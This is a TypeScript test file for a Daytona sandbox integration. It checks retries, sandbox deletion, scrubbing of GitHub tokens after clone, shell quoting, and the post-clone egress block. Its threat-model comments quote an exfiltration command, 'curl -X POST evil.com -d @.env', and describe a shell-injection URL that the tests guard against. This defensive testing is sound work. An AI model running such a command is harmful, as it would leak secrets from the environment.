import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";

const { getMock, MockDaytonaError, MockDaytonaValidationError, MockDaytonaNotFoundError, MockDaytonaRateLimitError } =
  vi.hoisted(() => {
    // Constructor mirrors the real `@daytona/sdk` `DaytonaError` signature
    // `(message, statusCode, headers, errorCode)` so tests can simulate the
    // structured error fields the SDK populates on a 4xx response. Subclassing
    // here ensures `instanceof DaytonaError` works in production code paths.
    class HoistedMockDaytonaError extends Error {
      constructor(
        message: string,
        readonly statusCode?: number,
        readonly headers?: Record<string, string>,
        readonly errorCode?: string,
      ) {
        super(message);
        this.name = "DaytonaError";
      }
    }

    class HoistedMockDaytonaValidationError extends HoistedMockDaytonaError {
      constructor(message: string, statusCode?: number, headers?: Record<string, string>, errorCode?: string) {
        super(message, statusCode, headers, errorCode);
        this.name = "DaytonaValidationError";
      }
    }

    class HoistedMockDaytonaNotFoundError extends Error {
      constructor(message = "Not found") {
        super(message);
        this.name = "DaytonaNotFoundError";
      }
    }

    // Sibling of `HoistedMockDaytonaError`, NOT a child. The retry helper
    // does `instanceof DaytonaRateLimitError` to classify retriable errors;
    // if we made this a subclass of the base mock, every plain
    // `MockDaytonaError` the existing tests throw would also satisfy the
    // check and trigger 5 retries × backoff each, blowing the 5s test
    // timeout. Disjoint hierarchies keep the legacy tests immune to the
    // wrapper while still letting any test that wants a rate-limit
    // scenario instantiate this class directly.
    class HoistedMockDaytonaRateLimitError extends Error {
      constructor(message = "Rate limited") {
        super(message);
        this.name = "DaytonaRateLimitError";
      }
    }

    return {
      getMock: vi.fn(),
      MockDaytonaError: HoistedMockDaytonaError,
      MockDaytonaValidationError: HoistedMockDaytonaValidationError,
      MockDaytonaNotFoundError: HoistedMockDaytonaNotFoundError,
      MockDaytonaRateLimitError: HoistedMockDaytonaRateLimitError,
    };
  });

vi.mock("@daytona/sdk", () => ({
  CodeLanguage: {
    TYPESCRIPT: "typescript",
  },
  Daytona: class MockDaytona {
    constructor(_options: unknown) {}

    get(remoteId: string) {
      return getMock(remoteId);
    }
  },
  DaytonaError: MockDaytonaError,
  DaytonaValidationError: MockDaytonaValidationError,
  DaytonaNotFoundError: MockDaytonaNotFoundError,
  // `daytona.ts` imports `DaytonaTimeoutError` at module load even though
  // the only `instanceof` check sits inside the sandbox-shell adapter and
  // is unreachable from these tests. We still export a class so the import
  // resolves to a real symbol (otherwise `instanceof undefined` would
  // throw if any future test exercised that path).
  DaytonaTimeoutError: MockDaytonaError,
  // Transitively required by `lib/daytonaRetry`, which wraps every Daytona
  // SDK call site in this file. The retry helper does `instanceof
  // DaytonaRateLimitError` to classify retriable errors; without an export
  // here the import resolves to `undefined` and `instanceof undefined`
  // would throw the moment any mocked error trips the helper. Crucially
  // this is a disjoint sibling of `MockDaytonaError` (not a subclass) —
  // existing tests throw plain `MockDaytonaError` instances and would
  // otherwise be misclassified as retriable, stalling each test for the
  // full retry × backoff schedule.
  DaytonaRateLimitError: MockDaytonaRateLimitError,
}));

import {
  assertSandboxProvisioningConfigured,
  cloneRepositoryInSandbox,
  deleteSandbox,
  getRemoteSandboxDetails,
  getSandboxState,
  probeLiveSandbox,
} from "./daytona";

describe("daytona state normalization", () => {
  beforeEach(() => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    getMock.mockReset();
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
  });

  test.each([
    ["deleted", "destroyed"],
    ["destroyed", "destroyed"],
    ["failed", "error"],
  ] as const)("normalizes %s when reading sandbox state", async (remoteState, expectedState) => {
    getMock.mockResolvedValue({
      id: "remote-1",
      state: remoteState,
      labels: { app: "systify" },
      refreshData: vi.fn().mockResolvedValue(undefined),
    });

    await expect(getSandboxState("remote-1")).resolves.toBe(expectedState);
  });

  describe("probeLiveSandbox", () => {
    function fakeSandbox(state: string) {
      return {
        id: "remote-probe",
        state,
        labels: { app: "systify" },
        refreshData: vi.fn().mockResolvedValue(undefined),
      };
    }

    test("returns ok when Daytona reports the sandbox as started", async () => {
      getMock.mockResolvedValue(fakeSandbox("started"));
      await expect(probeLiveSandbox("remote-probe")).resolves.toEqual({
        ok: true,
        remoteState: "started",
      });
    });

    test.each([
      ["archived", "archived", /live access to the repository wasn't available/i],
      ["stopped", "stopped", /wake it up/i],
      ["failed", "error", /hit an error/i],
    ] as const)(
      "maps non-started state %s to a not-ok probe with reason=%s",
      async (remoteState, expectedReason, messageMatcher) => {
        getMock.mockResolvedValue(fakeSandbox(remoteState));
        const probe = await probeLiveSandbox("remote-probe");
        expect(probe.ok).toBe(false);
        if (probe.ok) throw new Error("probe should not be ok");
        expect(probe.reason).toBe(expectedReason);
        expect(probe.message).toMatch(messageMatcher);
      },
    );

    test("returns reason=deleted when Daytona returns 404", async () => {
      getMock.mockRejectedValue(new MockDaytonaNotFoundError());
      const probe = await probeLiveSandbox("remote-probe");
      expect(probe.ok).toBe(false);
      if (probe.ok) throw new Error("probe should not be ok");
      expect(probe.reason).toBe("deleted");
      expect(probe.remoteState).toBe("destroyed");
      expect(probe.message).toMatch(/live access to the repository wasn't available/i);
    });

    test("returns reason=unknown when Daytona reports an unrecognized state", async () => {
      getMock.mockResolvedValue(fakeSandbox("rebooting"));
      const probe = await probeLiveSandbox("remote-probe");
      expect(probe.ok).toBe(false);
      if (probe.ok) throw new Error("probe should not be ok");
      expect(probe.reason).toBe("unknown");
    });

    test("rethrows non-not-found Daytona errors", async () => {
      // 400 (validation) rather than 500 here: the retry wrapper in
      // `lib/daytonaRetry` correctly retries 5xx transient failures, which
      // would stall this test for the full backoff schedule. A 4xx code
      // exercises the same "rethrow non-NotFound Daytona errors" path the
      // test cares about, immediately. The companion fake-timers test below
      // covers the 5xx-retry-then-rethrow path without paying real wall time.
      getMock.mockRejectedValue(new MockDaytonaError("upstream blew up", 400));
      await expect(probeLiveSandbox("remote-probe")).rejects.toThrow(/upstream blew up/);
    });

    test("retries persistent 5xx through the backoff schedule, then rethrows", async () => {
      // Pin Math.random so jitter = 0 and the retry schedule has
      // deterministic timings the fake clock can advance through.
      // The `expect(...).rejects.toThrow(...)` handler is attached
      // BEFORE `runAllTimersAsync` so Node sees a rejection handler on
      // the outer promise the moment any inner retry fires — see the
      // equivalent pattern in `lib/daytonaRetry.test.ts`'s
      // "re-throws the original error after MAX_RETRIES" test.
      vi.useFakeTimers();
      vi.spyOn(Math, "random").mockReturnValue(0.5);
      try {
        getMock.mockRejectedValue(new MockDaytonaError("upstream still broken", 500));
        const probe = probeLiveSandbox("remote-probe");
        const rejection = expect(probe).rejects.toThrow(/upstream still broken/);
        await vi.runAllTimersAsync();
        await rejection;
        // MAX_RETRIES = 5 in `lib/daytonaRetry.ts` — one initial attempt
        // plus 4 retries before the helper gives up and rethrows.
        expect(getMock).toHaveBeenCalledTimes(5);
      } finally {
        vi.useRealTimers();
        vi.restoreAllMocks();
      }
    });
  });

  test("returns normalized labels and state from remote sandbox details", async () => {
    getMock.mockResolvedValue({
      id: "remote-2",
      organizationId: "org-1",
      createdAt: "2026-04-24T00:00:00.000Z",
      updatedAt: "2026-04-24T00:00:01.000Z",
      state: "failed",
      labels: { app: "systify" },
      refreshData: vi.fn().mockResolvedValue(undefined),
    });

    await expect(getRemoteSandboxDetails("remote-2")).resolves.toEqual({
      exists: true,
      remoteId: "remote-2",
      organizationId: "org-1",
      createdAt: "2026-04-24T00:00:00.000Z",
      updatedAt: "2026-04-24T00:00:01.000Z",
      labels: { app: "systify" },
      state: "error",
    });
  });
});

describe("deleteSandbox", () => {
  beforeEach(() => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    getMock.mockReset();
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
  });

  // Convex schedules cleanup against `remoteId`s that Daytona may have
  // already reclaimed (auto-archive/auto-delete TTL, webhook race, retry
  // after a prior partial success). Treating 404 as success keeps the
  // contract aligned with idempotent-delete conventions (K8s
  // `--ignore-not-found`, S3 `DeleteObject`) and prevents the cleanup job
  // from being marked failed for a benign race.
  test("treats 404 as success so the Convex/Daytona race does not surface as a failed cleanup", async () => {
    getMock.mockRejectedValue(new MockDaytonaNotFoundError());
    await expect(deleteSandbox("remote-already-gone")).resolves.toBeUndefined();
  });

  test("rethrows non-not-found Daytona errors", async () => {
    // See the parallel comment in the `probeLiveSandbox` block: a 4xx code
    // keeps the test on the fast-fail path instead of routing through the
    // 5xx retry schedule, which is correct production behaviour but would
    // blow this test's 5s timeout. The companion fake-timers test below
    // covers the 5xx-retry-then-rethrow path without paying real wall time.
    getMock.mockRejectedValue(new MockDaytonaError("upstream blew up", 400));
    await expect(deleteSandbox("remote-broken")).rejects.toThrow(/upstream blew up/);
  });

  test("retries persistent 5xx through the backoff schedule, then rethrows", async () => {
    // See the parallel test in `probeLiveSandbox` for why the rejection
    // handler is attached before `runAllTimersAsync`.
    vi.useFakeTimers();
    vi.spyOn(Math, "random").mockReturnValue(0.5);
    try {
      getMock.mockRejectedValue(new MockDaytonaError("upstream still broken", 500));
      const deletion = deleteSandbox("remote-broken-5xx");
      const rejection = expect(deletion).rejects.toThrow(/upstream still broken/);
      await vi.runAllTimersAsync();
      await rejection;
      expect(getMock).toHaveBeenCalledTimes(5);
    } finally {
      vi.useRealTimers();
      vi.restoreAllMocks();
    }
  });
});

/**
 * Clone-time token scrub.
 *
 * The threat: `sandbox.git.clone(url, ..., username, token)` writes the
 * password into `.git/config` as part of the remote URL
 * (`https://x-access-token:<TOKEN>@github.com/...`), where it sits for the
 * lifetime of the sandbox. The LLM can read that file via `run_shell` and
 * the token would enter the durable `messages` table.
 *
 * The fix: immediately after `git.clone` succeeds, run
 * `git remote set-url origin <canonical-url>` to overwrite the remote URL
 * with a credential-free version. These tests pin three properties:
 *   1. The scrub command runs on every clone (auth or no auth — it's
 *      hardening, not feature-gated).
 *   2. The scrub runs *before* the branch / SHA inspection commands, so
 *      a failure in those won't leave a clone with a tokened remote URL.
 *   3. The substituted URL is POSIX-single-quoted so a malicious or
 *      malformed `args.url` cannot break out of the shell command.
 */
/**
 * Build a Daytona sandbox mock that:
 *   - records every `git.clone(...)` and `process.executeCommand(...)`
 *     in the order they are invoked (so tests can assert ordering);
 *   - returns plausible `result` strings from branch / SHA commands
 *     so the function's return value remains assertable;
 *   - records every `updateNetworkSettings(...)` call and optionally
 *     delegates to a caller-supplied implementation (e.g., to throw a
 *     simulated Tier 1/2 rejection).
 *
 * Lifted to module scope so multiple describe blocks (token scrub,
 * post-clone network lockdown) share one helper rather than diverging.
 */
function makeSandboxMock(
  options: { updateNetworkSettings?: (settings: { networkBlockAll?: boolean }) => Promise<void> } = {},
) {
  const cloneCalls: unknown[][] = [];
  const executeCalls: { command: string; cwd?: string }[] = [];
  const networkSettingsCalls: { networkBlockAll?: boolean }[] = [];
  const sandbox = {
    git: {
      clone: vi.fn(async (...args: unknown[]) => {
        cloneCalls.push(args);
      }),
    },
    process: {
      executeCommand: vi.fn(async (command: string, cwd?: string) => {
        executeCalls.push({ command, cwd });
        if (command === "git branch --show-current") {
          return { exitCode: 0, result: "main\n" };
        }
        if (command === "git rev-parse HEAD") {
          return { exitCode: 0, result: "deadbeefcafef00d\n" };
        }
        // The token-scrub command (`git remote set-url origin ...`)
        // is fire-and-forget; an empty result is fine.
        return { exitCode: 0, result: "" };
      }),
    },
    updateNetworkSettings: vi.fn(async (settings: { networkBlockAll?: boolean }) => {
      networkSettingsCalls.push(settings);
      if (options.updateNetworkSettings) {
        await options.updateNetworkSettings(settings);
      }
    }),
  };
  return { sandbox, cloneCalls, executeCalls, networkSettingsCalls };
}

describe("cloneRepositoryInSandbox — token scrub", () => {
  const SANDBOX_REMOTE_ID = "sandbox-clone-1";

  beforeEach(() => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    getMock.mockReset();
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
  });

  test("rewrites the origin URL to the credential-free canonical URL after a tokened clone", async () => {
    const { sandbox, executeCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    const canonicalUrl = "https://github.com/acme/widget.git";
    const fakeInstallationToken = `ghs_${"x".repeat(40)}`;

    const result = await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: canonicalUrl,
      branch: "main",
      token: fakeInstallationToken,
    });

    expect(result).toEqual({ branch: "main", commitSha: "deadbeefcafef00d" });

    // The scrub command runs against the cloned repo's working dir
    // ("repo") with the canonical URL, single-quoted.
    const scrubCall = executeCalls.find((call) => call.command.startsWith("git remote set-url origin"));
    expect(scrubCall).toBeDefined();
    expect(scrubCall?.cwd).toBe("repo");
    expect(scrubCall?.command).toBe(`git remote set-url origin '${canonicalUrl}'`);

    // The token must NOT appear in any executed command — that is the
    // whole point of the scrub. A regression that shells out the raw
    // tokened URL would re-introduce the leak.
    for (const call of executeCalls) {
      expect(call.command).not.toContain(fakeInstallationToken);
      expect(call.command).not.toContain("x-access-token");
    }
  });

  test("scrub runs BEFORE branch / SHA inspection so a downstream failure cannot leave a tokened remote URL", async () => {
    const { sandbox, executeCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
      token: `ghs_${"x".repeat(40)}`,
    });

    // Order of `executeCommand` calls is: scrub → branch lookup → sha.
    // Pinning the order matters: if a future refactor moves the scrub
    // *after* the inspection commands, an inspection failure (which
    // throws) would skip the scrub entirely and leave the tokened URL
    // in `.git/config` for the lifetime of the sandbox.
    expect(executeCalls.map((call) => call.command)).toEqual([
      "git remote set-url origin 'https://github.com/acme/widget.git'",
      "git branch --show-current",
      "git rev-parse HEAD",
    ]);
  });

  test("scrub runs unconditionally, even for unauthenticated clones (hardening, not feature-gated)", async () => {
    // For a public-repo clone with no token, the resulting `.git/config`
    // already lacks credentials. The scrub is a no-op in that case
    // (idempotent overwrite), but it still runs — uniform post-clone
    // state simplifies reasoning and prevents a future change to the
    // private-repo path from accidentally skipping the scrub for
    // public clones too.
    const { sandbox, executeCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/public-widget.git",
      branch: "main",
      // No token field at all.
    });

    const scrubCall = executeCalls.find((call) => call.command.startsWith("git remote set-url origin"));
    expect(scrubCall).toBeDefined();
    expect(scrubCall?.command).toBe(`git remote set-url origin 'https://github.com/acme/public-widget.git'`);
  });

  test("POSIX-single-quotes the URL substitution so embedded single quotes cannot break out of the command", async () => {
    // Defense in depth: in practice the import pipeline only ever
    // forwards canonical GitHub URLs (no shell metacharacters), but if
    // a future caller passed a less sanitized URL with an embedded
    // single quote, naive string interpolation
    // (`git remote set-url origin ${args.url}`) would let a crafted URL
    // close the quote and inject a follow-up command. The expected
    // escape pattern is `'` → `'\''` (close, escaped quote, reopen),
    // which is the canonical POSIX shell idiom.
    const { sandbox, executeCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    const adversarialUrl = "https://github.com/acme/oops'.git";
    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: adversarialUrl,
      branch: "main",
    });

    const scrubCall = executeCalls.find((call) => call.command.startsWith("git remote set-url origin"));
    // The raw `'` is replaced by `'\''`; the surrounding wrap is `'…'`.
    expect(scrubCall?.command).toBe(`git remote set-url origin 'https://github.com/acme/oops'\\''.git'`);
  });
});

/**
 * Post-clone network lockdown.
 *
 * The threat: even with the deny list and the read-only system prompt, the
 * sandbox container has unrestricted egress until Systify explicitly blocks
 * it. A chat reply that smuggles `curl -X POST evil.com -d @.env` (or any
 * deny-list bypass) past Layer 3 would otherwise complete the leak. Once the
 * source is on disk, Systify never needs sandbox-side network — every legit
 * tool (`read_file`, `list_dir`, `executeCommand`) rides Daytona's control
 * plane, which is independent of the sandbox container's outbound traffic.
 *
 * These tests pin the resolved contract:
 *   1. `updateNetworkSettings({ networkBlockAll: true })` is called on every
 *      clone (auth or no auth — hardening, not feature-gated).
 *   2. The block runs AFTER the token scrub. Reversing the order would leave
 *      the `.git/config` token reachable during the brief window before the
 *      iptables rule applies; the SDK call is also higher-latency than the
 *      one-shot scrub, so anything that could race against it benefits from
 *      the scrub-first ordering.
 *   3. If `updateNetworkSettings` throws (typically Daytona Tier 1/2), the
 *      whole clone fails-closed: a sandbox with private content on disk and
 *      open egress is the worst-of-both-worlds posture, so we propagate the
 *      error to the import pipeline rather than silently degrading.
 */
describe("cloneRepositoryInSandbox — post-clone network lockdown", () => {
  const SANDBOX_REMOTE_ID = "sandbox-network-1";

  beforeEach(() => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    // Force the secure-default branch for the original ordering / fail-closed
    // tests; the env-var-gating describe below flips this explicitly.
    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "true";
    getMock.mockReset();
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
  });

  test("blocks all egress after a tokened clone", async () => {
    const { sandbox, networkSettingsCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
      token: `ghs_${"x".repeat(40)}`,
    });

    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
    expect(sandbox.updateNetworkSettings).toHaveBeenCalledTimes(1);
  });

  test("blocks egress for unauthenticated public-repo clones too (hardening, not feature-gated)", async () => {
    const { sandbox, networkSettingsCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/public-widget.git",
      branch: "main",
    });

    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
  });

  test("network block runs AFTER the token scrub so the scrub is never skipped on a block failure", async () => {
    // We want the scrub to land first because (a) it is the security
    // invariant `daytona.test.ts` already pins, and (b) if the network
    // block call throws (Tier 1/2 limitation), we still want the on-disk
    // token leak removed before the import is failed and the sandbox is
    // cleaned up by the import pipeline.
    const callOrder: string[] = [];
    const { sandbox } = makeSandboxMock();
    sandbox.process.executeCommand = vi.fn(async (command: string) => {
      callOrder.push(`exec:${command}`);
      if (command === "git branch --show-current") {
        return { exitCode: 0, result: "main\n" };
      }
      if (command === "git rev-parse HEAD") {
        return { exitCode: 0, result: "deadbeefcafef00d\n" };
      }
      return { exitCode: 0, result: "" };
    });
    sandbox.updateNetworkSettings = vi.fn(async (settings: { networkBlockAll?: boolean }) => {
      callOrder.push(`network:blockAll=${settings.networkBlockAll}`);
    });
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
      token: `ghs_${"x".repeat(40)}`,
    });

    const scrubIndex = callOrder.findIndex((entry) => entry.startsWith("exec:git remote set-url origin"));
    const blockIndex = callOrder.findIndex((entry) => entry.startsWith("network:blockAll=true"));
    const branchIndex = callOrder.findIndex((entry) => entry === "exec:git branch --show-current");

    expect(scrubIndex).toBeGreaterThanOrEqual(0);
    expect(blockIndex).toBeGreaterThan(scrubIndex);
    expect(branchIndex).toBeGreaterThan(blockIndex);
  });

  test("propagates the error and fails-closed when the SDK rejects updateNetworkSettings (Tier 1/2 case)", async () => {
    const tierLimitationError = new Error(
      "Sandbox-level network policy override is only available for Tier 3+ organizations.",
    );
    const { sandbox } = makeSandboxMock({
      updateNetworkSettings: async () => {
        throw tierLimitationError;
      },
    });
    getMock.mockResolvedValue(sandbox);

    await expect(
      cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "https://github.com/acme/widget.git",
        branch: "main",
        token: `ghs_${"x".repeat(40)}`,
      }),
    ).rejects.toThrow(tierLimitationError);
  });
});

/**
 * Tier-aware env-var gating for the post-clone block.
 *
 * Daytona's `updateNetworkSettings` is rejected at the API layer for
 * organizations on Tier 1 / Tier 2 — those operators cannot rely on the
 * iptables-layer egress block at all. `DAYTONA_POST_CLONE_BLOCK_NETWORK`
 * lets a deployment opt out of the SDK call so import does not fail-closed
 * on a tier limitation it cannot fix without a billing change.
 *
 * The contract these tests pin:
 *   1. Unset (default) → call happens (secure-by-default; matches the
 *      ordering / fail-closed describe above).
 *   2. Truthy values (`true` / `1` / `yes` / `on`, case-insensitive) →
 *      call happens.
 *   3. Falsy values (`false` / `0` / `no` / `off`, case-insensitive) →
 *      call is skipped AND a `post_clone_network_block_skipped` warn is
 *      emitted, so operators have a structured signal that the network
 *      layer is no longer enforcing egress.
 *   4. Garbage / typo values → fall back to `true`. A typo in env config
 *      must not silently disable a security control.
 *   5. Skipping the block does NOT skip the token scrub. Layer 1 (token
 *      scrub) and Layer 4 (network block) are independent invariants;
 *      the gate only controls Layer 4.
 */
describe("cloneRepositoryInSandbox — DAYTONA_POST_CLONE_BLOCK_NETWORK gating", () => {
  const SANDBOX_REMOTE_ID = "sandbox-tier-gate-1";

  beforeEach(() => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
    getMock.mockReset();
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
  });

  test("unset env defaults to secure (calls updateNetworkSettings)", async () => {
    const { sandbox, networkSettingsCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
    });

    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
  });

  test.each(["true", "1", "yes", "on", "TRUE", "On"])("truthy value %s calls updateNetworkSettings", async (value) => {
    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = value;
    const { sandbox, networkSettingsCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
    });

    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
  });

  test.each(["false", "0", "no", "off", "FALSE", "Off"])(
    "falsy value %s skips updateNetworkSettings and warns",
    async (value) => {
      process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = value;
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
      const { sandbox, networkSettingsCalls } = makeSandboxMock();
      getMock.mockResolvedValue(sandbox);

      await cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "https://github.com/acme/widget.git",
        branch: "main",
      });

      expect(networkSettingsCalls).toEqual([]);
      expect(sandbox.updateNetworkSettings).not.toHaveBeenCalled();
      const warnCall = warnSpy.mock.calls.find(([message]) =>
        typeof message === "string" ? message.includes("post_clone_network_block_skipped") : false,
      );
      expect(warnCall).toBeDefined();
      warnSpy.mockRestore();
    },
  );

  test("garbage / typo values fall back to the secure default", async () => {
    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "perhaps";
    const { sandbox, networkSettingsCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
    });

    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
  });

  test("skipping the block does NOT skip the token scrub", async () => {
    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "false";
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const { sandbox, executeCalls } = makeSandboxMock();
    getMock.mockResolvedValue(sandbox);

    await cloneRepositoryInSandbox({
      remoteId: SANDBOX_REMOTE_ID,
      url: "https://github.com/acme/widget.git",
      branch: "main",
      token: `ghs_${"x".repeat(40)}`,
    });

    const scrubCall = executeCalls.find((call) => call.command.startsWith("git remote set-url origin"));
    expect(scrubCall).toBeDefined();
    expect(scrubCall?.command).toBe(`git remote set-url origin 'https://github.com/acme/widget.git'`);
    warnSpy.mockRestore();
  });
});

/**
 * `assertSandboxProvisioningConfigured` is the fail-fast gate that the import
 * pipeline calls before any side effects: a missing Daytona API key should
 * surface as one actionable error message at the entry point rather than
 * cascading into a confusing failure deeper in the provisioning flow.
 */
describe("assertSandboxProvisioningConfigured", () => {
  beforeEach(() => {
    delete process.env.DAYTONA_API_KEY;
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
  });

  test("throws when DAYTONA_API_KEY is missing", () => {
    expect(() => assertSandboxProvisioningConfigured()).toThrow(/DAYTONA_API_KEY/);
  });

  test("passes when DAYTONA_API_KEY is set", () => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    expect(() => assertSandboxProvisioningConfigured()).not.toThrow();
  });
});

/**
 * Clone error enrichment.
 *
 * The Daytona toolbox surfaces `git.clone` failures as `DaytonaError`
 * subclasses whose `message` is often the bare axios default
 * ("Request failed with status code 400") because the toolbox returns
 * an empty body for many validation rejections. Without status code,
 * SDK error code, and clone context (host / branch / auth posture),
 * post-mortem is guesswork.
 *
 * These tests pin the wrapper's contract: it must (1) embed the
 * structured fields in a single human-readable `message`, (2) preserve
 * the original error's `name` so log filters keyed on
 * `DaytonaValidationError` keep matching, (3) forward the original
 * error as `cause` so observability can recurse and surface
 * `statusCode`/`errorCode` as structured fields, and (4) never include
 * the installation token in the wrapped message.
 */
describe("cloneRepositoryInSandbox — error enrichment", () => {
  const SANDBOX_REMOTE_ID = "sandbox-clone-err-1";

  beforeEach(() => {
    process.env.DAYTONA_API_KEY = "test-api-key";
    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "true";
    getMock.mockReset();
  });

  afterEach(() => {
    delete process.env.DAYTONA_API_KEY;
    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
  });

  test("wraps a Daytona validation error with host, branch, auth posture, status, and SDK code", async () => {
    const underlying = new MockDaytonaValidationError(
      "Request failed with status code 400",
      400,
      { "x-daytona-request-id": "req-abc" },
      "GIT_CLONE_FAILED",
    );
    const { sandbox } = makeSandboxMock();
    sandbox.git.clone = vi.fn(async () => {
      throw underlying;
    });
    getMock.mockResolvedValue(sandbox);

    const fakeInstallationToken = `ghs_${"x".repeat(40)}`;
    try {
      await cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "https://github.com/acme/private-widget.git",
        branch: "main",
        token: fakeInstallationToken,
      });
      throw new Error("expected cloneRepositoryInSandbox to throw");
    } catch (caught) {
      // The wrapper preserves the original SDK error class name so
      // existing log filters / dashboards keyed on
      // `DaytonaValidationError` keep matching after enrichment.
      expect(caught).toBeInstanceOf(Error);
      const err = caught as Error;
      expect(err.name).toBe("DaytonaValidationError");

      // Diagnostic context is embedded in `message` so it propagates to
      // both Convex logs (via `serializeError`) and the import row's
      // `errorMessage` column (rendered in the UI).
      expect(err.message).toContain("host=github.com");
      expect(err.message).toContain("branch=main");
      expect(err.message).toContain("with installation token");
      expect(err.message).toContain("Daytona HTTP 400");
      expect(err.message).toContain("code=GIT_CLONE_FAILED");
      expect(err.message).toContain("Request failed with status code 400");

      // Original error chained as cause so observability can walk the
      // chain and surface structured fields automatically.
      expect(err.cause).toBe(underlying);

      // SECURITY INVARIANT: the installation token is never part of the
      // wrapped message. The wrapper carries a boolean ("with installation
      // token") rather than the credential itself.
      expect(err.message).not.toContain(fakeInstallationToken);
      expect(err.message).not.toContain("ghs_");
    }
  });

  test("describes branch as `(default)` when the caller did not specify one", async () => {
    // Most imports omit `branch` and rely on the remote's default. The
    // wrapper must distinguish this from "branch=undefined" / "branch="
    // so an operator triaging logs can tell at a glance whether the
    // caller asked for a specific branch.
    const underlying = new MockDaytonaValidationError("upstream rejected", 400);
    const { sandbox } = makeSandboxMock();
    sandbox.git.clone = vi.fn(async () => {
      throw underlying;
    });
    getMock.mockResolvedValue(sandbox);

    await expect(
      cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "https://github.com/acme/widget.git",
      }),
    ).rejects.toThrow(/branch=\(default\)/);
  });

  test("describes auth posture as `without auth` for an unauthenticated public clone", async () => {
    const underlying = new MockDaytonaValidationError("upstream rejected", 400);
    const { sandbox } = makeSandboxMock();
    sandbox.git.clone = vi.fn(async () => {
      throw underlying;
    });
    getMock.mockResolvedValue(sandbox);

    await expect(
      cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "https://github.com/acme/public-widget.git",
        branch: "main",
      }),
    ).rejects.toThrow(/without auth/);
  });

  test("falls back gracefully when the URL cannot be parsed (helper must not panic on the error path)", async () => {
    // The wrapper executes after a clone has already failed; a second
    // exception from URL parsing would mask the original failure. Pin
    // that the fallback ("(unparseable url)") is used instead.
    const underlying = new MockDaytonaValidationError("upstream rejected", 400);
    const { sandbox } = makeSandboxMock();
    sandbox.git.clone = vi.fn(async () => {
      throw underlying;
    });
    getMock.mockResolvedValue(sandbox);

    await expect(
      cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "not-a-valid-url-at-all",
        branch: "main",
      }),
    ).rejects.toThrow(/host=\(unparseable url\)/);
  });

  test("passes plain Error subclasses through with minimal wrapping (no Daytona-specific fields)", async () => {
    // Non-Daytona errors — e.g. a network timeout that surfaces as a
    // plain `Error` — should still gain clone context but must not have
    // fabricated `statusCode` / `errorCode` fragments in the message.
    const underlying = new Error("Connection reset by peer");
    underlying.name = "NetworkError";
    const { sandbox } = makeSandboxMock();
    sandbox.git.clone = vi.fn(async () => {
      throw underlying;
    });
